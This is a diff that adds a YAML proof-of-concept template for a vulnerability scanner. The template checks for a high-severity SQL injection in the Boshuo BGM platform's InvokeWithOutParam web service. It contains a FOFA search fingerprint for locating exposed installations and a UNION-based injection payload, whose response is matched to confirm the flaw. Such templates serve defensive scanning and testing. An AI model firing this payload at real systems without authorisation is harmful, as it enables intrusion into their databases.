@@ -1,0 +1,34 @@
+id: poc-yaml-bosure-bgm-invokewithoutparam-sqli
+info:
+  name: 博硕BGM InvokeWithOutParam SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 博硕BGM
+  fofa: body="Libs/Platform.lib"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /Service/RESTFulWebService/RESTFulServiceForWeb.asmx/InvokeWithOutParam
+  headers:
+    Content-Type: application/json
+  data: "{\n  \"assembly\": \"Crystal.PlatForm.Basic\",\n  \"className\": \"Crystal.PlatForm.Basic.clsDictionary\"\
+    ,\n  \"method\": \"GetDicCommonItem\",\n  \"isCacheInvoke\": true,\n  \"param\"\
+    : [\"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}')),NULL,NULL,NULL,NULL--\
+    \ VJMn\"]\n}\n"
+  expression: 'status_code == 200 &&
+
+    contains(body,"0x" + t2) &&
+
+    contains(body,"ReturnType") &&
+
+    contains(body,"ReturnData") &&
+
+    contains(body,"SubOrgId") &&
+
+    !contains(body,"<")
+
+    '
+transport: http
